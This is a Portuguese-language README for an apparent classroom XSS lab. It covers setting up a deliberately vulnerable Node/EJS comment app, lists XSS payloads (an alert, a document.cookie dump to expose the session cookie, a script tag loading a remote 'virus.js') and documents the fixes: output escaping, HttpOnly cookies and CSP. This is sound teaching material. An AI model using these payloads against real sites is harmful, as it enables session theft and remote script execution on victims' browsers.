# Forkando e clonando este repositório

1. Faça _login_ no [GitHub](https://github.com).
2. Acesse [https://github.com/faustocintra/vulcom-sqli-2025-2](https://github.com/faustocintra/vulcom-sqli-2025-2).
3. Clique sobre o botão `[Fork]` no canto superior direito.
4. Na página seguinte ("Create new fork"), não altere nada, simplesmente clique sobre o botão `[Create fork]`. Aguarde.
5. Confira se a URL mostrada no navegador corresponde a "https://github.com/**<SEU USUÁRIO>**/vulcom-sqli-2025-2".
6. Clique sobre o botão verde `[Code]` e copie o endereço do seu repositório forkado.
7. Abra o Visual Studio Code. Se houver algum projeto aberto, feche-o usando a opção de menu `Arquivo > Fechar Pasta` (ou `File > Close folder`).
8. Clique sobre o botão que se parece com um `Y` na barra vertical esquerda do Visual Studio Code. Em seguida, clique sobre o botão `[Clonar repositório...]` (ou `[Clone repository...]`). Nessa etapa, se o Git não estiver instalado na máquina, será necessário baixá-lo (a partir de [https://git-scm.com/](https://git-scm.com/)) e instalá-lo antes de poder clonar o repositório.
9. Na caixa de diálogo que se abre no alto da janela, cole o endereço do repositório copiado no passo 6.
10. Escolha um pasta local do computador para armazenar os arquivos do repositório clonado.
11. Ao ser perguntado se deseja abrir o repositório clonado, clique sobre o botão `[Abrir]`.
12. 7. Abra o terminal integrado do VS Code (`Ctrl+Aspa simples`).
13. Instale as dependências do projeto executando `npm install` no terminal.
14. Verifique se foram detectadas vulnerabilidades. Em caso positivo, execute `npm audit fix`.
15. Para rodar o projeto, execute `npm start` no terminal.
16. Acesse a aplicação em [http://localhost:3000](http://localhost:3000).

---

### 🧀 Explorando a vulnerabilidade

A aplicação permite **comentários**, mas **não sanitiza a entrada do usuário**.
Isso significa que você pode inserir **código JavaScript malicioso**.

Experimente postar este comentário:

```html
<script>alert('XSS encontrado!');</script>
```

Se a aplicação estiver vulnerável, você verá um **alert()** sendo executado no navegador! 🔥

---

### 🚩 Capturando a Flag

Dentro da aplicação há uma _flag_ escondida. Tente capturá-la usando:

```html
<script>document.write('<h1>' + document.cookie + '</h1>');</script>
```

Se bem-sucedido, o **_cookie_ da sessão** será exposto, o que pode ser usado para roubar a identidade de usuários logados.

---

### ☠️ Executando um _script_ malicioso mais "interessante

Experimente comentar

```html
<script src="https://faustocintra.com.br/_seg/virus.js"></script>
```

---

### 🚀 Desafio extra

Modifique o código para **corrigir a vulnerabilidade**! Algumas técnicas incluem:

- **Sanitização da entrada** (escape de HTML ou bibliotecas como `DOMPurify`).
- **Uso de Content Security Policy (CSP)** para bloquear execução de _scripts_ injetados.
- **Definir a flag `HttpOnly` nos _cookies_** para impedir acesso via JavaScript.
- Usar a **_tag_ de saída de HTML com escape** da biblioteca **ejs** (com a qual o _front-end_ desta aplicação foi desenvolvido).

---

💡 **Dica:** Teste diferentes abordagens de ataque e tente explorar outras vulnerabilidades no código! Boa sorte! 🚀

---

### 🛡️ Solução Implementada

Para corrigir as vulnerabilidades de segurança, aplicamos três camadas de defesa em série:

1.  **Escape de Saída no Template (EJS)**
    -   **O que foi feito:** No arquivo `views/comments.ejs`, a tag de renderização de conteúdo foi alterada de `<%- comment.content %>` para `<%= comment.content %>`.
    -   **Por quê:** A tag `<%= %>` realiza o "escape" de HTML, convertendo caracteres especiais (como `<` e `>`) em suas entidades equivalentes (ex: `&lt;` e `&gt;`). Isso faz com que qualquer script injetado seja renderizado como texto inofensivo na página, em vez de ser executado pelo navegador. Esta é a defesa primária contra XSS.

2.  **Flag `HttpOnly` nos Cookies**
    -   **O que foi feito:** No arquivo `index.js`, ao criar o cookie de sessão, a opção `httpOnly: true` foi definida.
    -   **Por quê:** Esta flag instrui o navegador a nunca permitir que o cookie seja acessado por JavaScript do lado do cliente (`document.cookie`). Isso mitiga ataques de roubo de sessão, pois mesmo que um invasor consiga executar um script, ele não será capaz de ler o cookie da sessão.

3.  **Política de Segurança de Conteúdo (CSP)**
    -   **O que foi feito:** Utilizando a biblioteca `helmet`, um cabeçalho `Content-Security-Policy` foi adicionado a todas as respostas do servidor. A política configurada foi `script-src 'self'; style-src 'self' 'unsafe-inline'`.
    -   **Por quê:** A CSP funciona como uma lista de permissões, instruindo o navegador sobre quais fontes de conteúdo são confiáveis. Com essa política, o navegador só executará scripts vindos do próprio domínio (`'self'`) e bloqueará todos os scripts embutidos (inline) ou de fontes externas, fornecendo uma camada de defesa robusta contra a execução de código malicioso.